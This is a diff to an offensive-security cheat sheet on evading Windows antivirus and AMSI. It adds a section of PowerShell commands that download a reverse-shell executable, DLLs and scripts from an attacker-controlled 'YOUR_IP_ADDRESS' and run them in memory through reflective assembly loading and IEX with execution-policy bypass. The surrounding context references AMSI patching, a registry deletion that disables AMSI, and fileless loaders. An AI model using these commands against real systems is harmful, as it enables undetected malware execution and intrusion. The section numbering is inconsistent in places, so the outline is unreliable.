@@ -10,15 +10,17 @@ I.   Reminder & Definitions
      ➤ Microsoft Antimalware Scan Interface (AMSI)
      ➤ Windows Security features and Microsoft security products
 
-II.  Examples of AMSI bypass techniques to be able to download and execute straight into memory any offensive PowerShell scripts (and PE files 
-     thanks to the Invoke-ReflectivePEInjection technique) without being detected by AV products 
+II.  Examples of "living off the land" techniques using PowerShell (i.e. download and execute straight into memory PE, DLL and PoSh scripts) 
+
+III. Examples of AMSI bypass techniques (for PowerShell) to be able to download and execute straight into memory any offensive PowerShell scripts / PE / DLL 
+     without being detected by AV products 
      ➤ Examples of AV bypass by forcing the AMSI initialization to fail in a PowerShell session 
      ➤ Examples of AV bypass by patching the AMSI DLL
      ➤ Examples of AV bypass by modifying a registry key to diasable the AMSI (admin priv required)
      ➤ Examples of AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
 
-III. Examples of techniques to bypass AV products and to download and execute straight into memory any offensive Portable Executable (PE) files
-     (without using PowerShell) 
+VI.  Examples of techniques to bypass AV products and to download and execute straight into memory any offensive Portable Executable (PE) files
+     without using PowerShell
      ➤ Example of AV bypass (fileless technique + ETW patching + NTDLL unhooking) using the tool 'FilelessRemotePE' (it runs only C/C++/ASM based binaries)
      ➤ Example of AV bypass (fileless technique + AMSI and ETW patching) using the tool 'ExecRemoteAssembly' 	    (it runs only .Net assemblies based on C#)
      ➤ Example of AV bypass (fileless technique + AMSI patching) using the tool 'EAPrimer'			    (it runs only .Net assemblies based on C#)
@@ -130,13 +132,79 @@ Windows Security features and Microsoft security products
 > The Windows Lockdown Policy (WLDP aka Device Guard) 
   - It checks the digital signature of dynamic code.
 
+
+
 ================================================================================================================================================
-II.  Examples of AMSI bypass techniques to be able to download and execute straight into memory any offensive PowerShell scripts (and PE files 
-     thanks to the Invoke-ReflectivePEInjection technique) without being detected by AV products 
+II.  Examples of "living off the land" techniques using PowerShell (i.e. download and execute straight into memory PE, DLL and PoSh scripts) 
+================================================================================================================================================
+
+PowerShell is built on .NET and we can interact with .NET in many ways with PowerShell. 
+
+There are several methods to load straight into memory .Net Assemblies (PE and DLL) such as : 
+> Add assembly with Add-Type cmdletPermalink
+> Add assembly with Reflection Assembly
+> Add assembly via a string objectPermalink
+  + Step 1 - Get Base64 encoded string
+  + Step 2 - Embed assembly string in script
+    $dll = 'TVqQAAMAAAAEAAAA//8AALgAAAAA...'
+    $bytes = [System.Convert]::FromBase64String($dll)
+    [System.Reflection.Assembly]::Load($bytes)
+
+Below are some examples of PowerShell commands that allow us to remotely download and inject straight into memory .Net Assemblies (PE and DLL) and PowerShell scripts.
+Keep in mind that to avoid AV detection it will necessary to bypass the AMSI (Refer to the next section).
+
+----------------------------------------------------------------------------------
+Examples - Download and execute a .Net PE straight into memory using PowerShell
+----------------------------------------------------------------------------------
+
+PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/CsharpRevShell.exe')
+PS C:\temp> $assem = [System.Reflection.Assembly]::Load($data)
+PS C:\temp> [CsharpRevShell.Program]::Main("".Split())
+
+OR
+
+PS C:\temp> $bytes = (Invoke-WebRequest "http://YOUR_IP_ADDRESS/CsharpRevShell.exe").Content;
+PS C:\temp> $assembly = [System.Reflection.Assembly]::Load($bytes);
+PS C:\temp> $entryPointMethod = $assembly.GetType('ProcessInjection.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
+PS C:\temp> $entryPointMethod.Invoke($null, (, [string[]] ('', '')));
+
+
+----------------------------------------------------------------------------------
+Example - Download and execute a .NET DLL straight into memory using PowerShell
+----------------------------------------------------------------------------------
+
+PS C:\temp> $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP_ADDRESS/MyLibrary.dll')
+PS C:\temp> $assem = [System.Reflection.Assembly]::Load($data)
+PS C:\temp> $class = $assem.GetType("MyLibrary.Class1")
+PS C:\temp> $method = $class.GetMethod("AwesomeFunctionName")
+PS C:\temp> $method.Invoke(0, $null)
+
+OR
+
++ Step 1 - Get a Base64 encoded string of the DLL
+  [convert]::ToBase64String((Get-Content -path "C:\PATH\MyLibrary.dll" -Encoding byte))
+
++ Step 2 - Embed assembly string in script 
+  $dll = 'TVqQAAMAAAAEAAAA//8AALgAAAAA...'
+  $bytes = [System.Convert]::FromBase64String($dll)
+  [System.Reflection.Assembly]::Load($bytes)
+
+
+------------------------------------------------------------------------
+Example - Download and execute a DLL straight into memory using PowerShell
+------------------------------------------------------------------------
+
+ PS C:\temp> powershell -exec bypass
+ PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://YOUR_IP_ADDRESS/Your-PowerShell-Script.ps1'); Your-PowerShell-script-function-name
+
+
+================================================================================================================================================
+III.  Examples of AMSI bypass techniques to be able to download and execute straight into memory any offensive PowerShell scripts (and PE files 
+      thanks to the Invoke-ReflectivePEInjection technique) without being detected by AV products 
 ================================================================================================================================================
 
 ------------------------------------------------------------------------------------------------------------------------------------------------
-2.1 Examples of AV bypass by forcing the AMSI initialization to fail in a PowerShell session
+3.1 Examples of AV bypass by forcing the AMSI initialization to fail in a PowerShell session
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 Test 1 - AMSI bypass as a low privileged user locally logged on a Windows 10 laptop with Defender (AV) enabled and up-to-date
@@ -247,7 +315,7 @@ This script contains malicious content and has been blocked by your antivirus so
 
 
 ------------------------------------------------------------------------------------------------------------------------------------------------
-2.2 Examples of AV bypass by patching the AMSI DLL
+3.2 Examples of AV bypass by patching the AMSI DLL
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 
@@ -329,7 +397,7 @@ At line:1 char:1
 
 
 ------------------------------------------------------------------------------------------------------------------------------------------------
-2.3 Example of AV bypass technique by modifying a registry key to disable the AMSI (admin priv required)
+3.3 Example of AV bypass technique by modifying a registry key to disable the AMSI (admin priv required)
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 AMSI Providers are responsible for the scanning process by the antivirus product and are registered in a location in the registry. 
@@ -340,7 +408,7 @@ PS C:\> Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E
 
 
 ------------------------------------------------------------------------------------------------------------------------------------------------
-2.4 Examples of AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
+3.4 Examples of AV bypass using the tool 'Evil-WinRM' (AMSI patching technique)
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 Test 1 - AMSI bypass with the tool evil-winrm running with a local admin account on a Windows 2016 server with Defender (AV) enabled and up-to-date
@@ -563,7 +631,7 @@ Affected items:
 
 
 ------------------------------------------------------------------------------------------------------------------------------------------------
-2.5 Example of Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
+3.5 Example of Living of the land on a Window server 2012 R2 with a basic AV installed and no AMSI
 ------------------------------------------------------------------------------------------------------------------------------------------------
 
 Note:  Just for testing purposes, I installed the old and basic AV 'Microsoft Security Essentials' in compatibility mode on a Windows server 2012 R2.
@@ -628,12 +696,12 @@ SID               : S-1-5-90-1
 
 
 ===========================================================================================================================================================
-III. Examples of techniques to bypass AV products and to download and execute straight into memory any offensive Portable Executable (PE) files
-     (without using PowerShell) 
+IV. Examples of techniques to bypass AV products and to download and execute straight into memory any offensive Portable Executable (PE) files
+    (without using PowerShell) 
 ===========================================================================================================================================================
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
-3.1 Example of AV bypass (Fileless technique + ETW patching + NTDLL unhooking) using the tool 'FilelessRemotePE'  
+4.1 Example of AV bypass (Fileless technique + ETW patching + NTDLL unhooking) using the tool 'FilelessRemotePE'  
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 => Source: https://github.com/D1rkMtr/FilelessRemotePE
@@ -840,7 +908,7 @@ PS C:\Users\Administrator\Documents\Tools-AD>
 
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
-3.2 Example of AV bypass (Fileless technique + AMSI & ETW patching) using the tool 'ExecRemoteAssembly' 
+4.2 Example of AV bypass (Fileless technique + AMSI & ETW patching) using the tool 'ExecRemoteAssembly' 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 => Source: https://github.com/D1rkMtr/ExecRemoteAssembly
@@ -934,7 +1002,7 @@ PS C:\Users\Administrator\Documents\Tools-AD\ExecRemoteAssembly-main> .\ExecRemo
 
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
-3.3 Example of AV bypass (Fileless technique + AMSI patching) using the tool 'EAPrimer'	
+4.3 Example of AV bypass (Fileless technique + AMSI patching) using the tool 'EAPrimer'	
 -----------------------------------------------------------------------------------------------------------------------------------------------------------
 
 => Source: https://github.com/m8sec/EAPrimer
